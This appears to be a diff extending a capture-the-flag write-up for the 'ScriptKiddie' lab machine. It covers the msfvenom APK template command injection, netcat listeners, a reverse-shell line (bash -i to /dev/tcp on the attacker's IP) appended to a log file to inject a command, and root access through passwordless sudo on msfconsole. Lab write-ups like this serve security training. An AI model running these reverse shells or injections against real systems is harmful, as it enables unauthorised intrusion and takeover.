@@ -44,8 +44,58 @@ Nmap done: 1 IP address (1 host up) scanned in 42.09 seconds
 We can see that the ports 5000 and 22 are open, 5000 for http and 22 for ssh
 
 Open the following link in the browser : http://10.10.10.226:5000
+
 ![alt text](https://miro.medium.com/max/1050/1*kHKLfZcara8e5gh-YGbe1Q.png)
+
+A very simple page with 3 sections, Nmap scan, msfvenom and searchSploit
+we can try command injection adn file Upload vulnerabilty
+after some research we found that is APK template command injection Vulnerabilty
+
+## Metasploit
+Let's create a payload with metasploit framework using the exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection module
+the generated payload is with .apk extension
+first, start a netcat listener on the port 5555
+```
+nc -nlvp 5555
+```
+now we can upload the payload with the Android platform and our ip address
+in out machine, we see that the reverse connection has been established
+user flag is in users.txt flag
+
+## Privilege Escalation
+in the logs directory, we can see that the file named hackers is owned by the group pwn, so we can execute commands with this group
+now let's establish a reverse shell using this file
+fisrt, start another netcat listener on the port 1234
+```
+nc -nlvp 1234
+```
+now in the box machine, run the following command :
 
 ```
 echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.76/1234 0>&1' #" >> hackers
 ```
+
+BOOOOOOOOOM, the reverse connection has been made but this time with user pwn. But we need the root user, let's give a look at the sudo permissions with this command :
+```
+sudo -l
+```
+```
+User pwn may run the following commands on ScriptKiddie:
+  (root) NOPASSWORD: /opt/metasploit-framework-6.0.9/msfconsole
+```
+
+Nice, so we can run metasploit with root privileges and without a password
+```
+sudo msfconsole
+```
+get access to the shell
+```
+msf6>/bin/bash
+```
+now we are logged in with root user
+the system falg is located at root.txt file
+
+
+
+
+
